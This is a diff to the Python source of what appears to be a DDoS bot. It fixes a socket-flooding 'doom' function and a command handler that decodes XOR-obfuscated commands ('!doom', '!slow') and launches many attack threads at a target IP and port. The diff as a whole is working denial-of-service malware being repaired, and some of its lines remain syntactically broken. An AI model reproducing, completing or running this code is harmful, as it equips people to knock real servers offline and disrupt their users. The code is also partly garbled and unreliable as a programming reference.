@@ -42,13 +42,13 @@ scan    = True#Default turn the scanner on
 
 def doom(ip, url, port):
         global stop
-        url= 'https://www.youtube.com/watch?v=Tf1DEI2lEe0'
+        #url= 'https://www.youtube.com/watch?v=Tf1DEI2lEe0'
         while True:
                 if stop :
                         break
                 try:
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        s.connet((str(ip),int(port)))
+                        s.connect((str(ip),int(port)))
                         if int(port) == 80 or int(port) == 443:
                                 ctx = ssl.SSLContext()
                                 s = ctx.wrap_socket(s,server_hostname=ip)
@@ -56,6 +56,8 @@ def doom(ip, url, port):
                         connection = "Connection: Keep-Alive\r\n"
                         s.send("\000".encode())
                         s.close()
+		except:
+			pass
 
 def send_back(ip):
 	try:
@@ -116,15 +118,15 @@ def handle(sock):
 						p = threading.Thread(target=HTTP, args =(command[1],command[2],command[4]))
 						p.start()
 					attack+=1
-        elif command[0] == xor_dec('QBcLCQo=',key)#encoded word !doom
-          if attack != 0:
-            stop = True
-            attack =0
-          stop= False
-          for _ in range(int(command[3])):
-            p= threading.Thread(target='HTTP' or 'HTTPS', args = command[1], command[2], command[3])#1=!volume, 2=ipaddress 3=port 80 or 443?
-            p.start()
-          attack+=1
+				elif command[0] == xor_dec('QBcLCQo=',key)#encoded word !doom
+					if attack != 0:
+						stop = True
+						attack =0
+					stop= False
+					for _ in range(int(command[3])):
+						p= threading.Thread(target=doom, args = command[1], command[2], command[4])#1=!volume, 2=ipaddress 3=port 80 or 443?
+						p.start()
+					attack+=1
 				elif command[0] == xor_dec('QAAICRA=',key):#encoded keywords: !slow
 					if attack != 0:
 						stop = True
